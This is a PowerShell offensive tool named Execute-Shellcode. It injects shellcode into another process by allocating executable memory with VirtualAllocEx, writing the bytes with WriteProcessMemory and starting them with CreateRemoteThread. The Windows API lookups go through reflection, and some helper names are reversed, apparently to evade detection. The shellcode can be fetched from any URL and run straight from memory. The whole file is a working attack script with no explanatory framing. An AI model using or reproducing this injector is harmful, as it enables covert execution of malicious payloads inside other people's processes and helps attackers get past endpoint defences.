function Execute-Shellcode {
    param (
        [Parameter(Mandatory = $false)]
        [byte[]]$bin,

        [Parameter(Mandatory = $false)]
        [string]$url,

        [Parameter(Mandatory = $true)]
        [int]$processId
    )

    if ($url -and $bin) {
        throw "You cannot provide both -bin and -url. Please provide only one."
    }

    if ($processId) {
        Get-Process -Id $processId -ErrorAction Stop | Out-Null
    }

    function cnuFpukooL {
        param ($moduleName, $funcName)
        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
            $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        $getProcAddress = $assem.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1
        $getModuleHandle = $assem.GetMethod('GetModuleHandle')

        $moduleHandle = $getModuleHandle.Invoke($null, @($moduleName))
        return $getProcAddress.Invoke($null, @($moduleHandle, $funcName))
    }

    function epyTetageleDteg {
        param (
            [Parameter(Position = 0, Mandatory = $true)][Type[]]$argsTypes,
            [Parameter(Position = 1)][Type]$retType = [void]
        )
        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $typeBuilder = $moduleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

        $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
        $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')

        return $typeBuilder.CreateType()
    }

    function HeavenlyRun([byte[]]$buf, [int]$processId) {

        $openProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (cnuFpukooL kernel32.dll OpenProcess),
            (epyTetageleDteg @([UInt32], [Boolean], [UInt32]) ([IntPtr]))
        )

        $virtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (cnuFpukooL kernel32.dll VirtualAllocEx),
            (epyTetageleDteg @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
        )

        $writeProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (cnuFpukooL kernel32.dll WriteProcessMemory),
            (epyTetageleDteg @([IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([Boolean]))
        )

        $createRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (cnuFpukooL kernel32.dll CreateRemoteThread),
            (epyTetageleDteg @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
            

        $hProcess = $openProcess.Invoke(0x1F0FFF, $false, $processId)
        if ($hProcess -eq [IntPtr]::Zero) { 
            throw "Failed to open target process." 
            }

        $size = $buf.Length
        $lpAlloc = $virtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $size, 0x1000 -bor 0x2000, 0x40)
        if ($lpAlloc -eq [IntPtr]::Zero) { 
            throw "Failed to allocate memory in target process." 
            }

        $bytesWritten = [IntPtr]::Zero
        $result = $writeProcessMemory.Invoke($hProcess, $lpAlloc, [Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($buf, 0), $size, $bytesWritten)
        if (-not $result) { 
            throw "Failed to write shellcode to target process." 
            }

        $hThread = $createRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $lpAlloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($hThread -eq [IntPtr]::Zero) { 
            throw "Failed to create remote thread in target process." 
            }

        Write-Output "Shellcode successfully injected"
    }

    if ($url) {
        try {
            $shellcodeString = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
            $shellcodeArray = $shellcodeString -replace "\s", "" -split ","
            [byte[]]$buf = $shellcodeArray | ForEach-Object { [Convert]::ToByte($_, 16) }
            HeavenlyRun $buf $processId
        } catch {
            throw "Failed to fetch or parse shellcode from URL. $_"
        }
    } elseif ($bin) {
        HeavenlyRun $bin $processId
    } else {
        throw "No shellcode or URL provided."
    }
}
